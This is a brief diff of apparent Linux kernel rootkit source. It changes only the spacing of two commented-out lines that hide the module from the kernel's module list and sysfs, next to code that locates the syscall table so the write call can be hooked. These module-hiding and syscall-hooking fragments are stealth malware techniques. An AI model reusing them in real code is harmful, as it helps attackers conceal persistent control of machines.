@@ -49,8 +49,8 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
 }
 
 int rkit_init(void) {
-    // list_del_init(&__this_module.list);
-    // kobject_del(&THIS_MODULE->mkobj.kobj);
+    //list_del_init(&__this_module.list);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
 
     if ((sys_call_table = (psize *) find())) {
 	//same as printf except designed for use w/ kernel
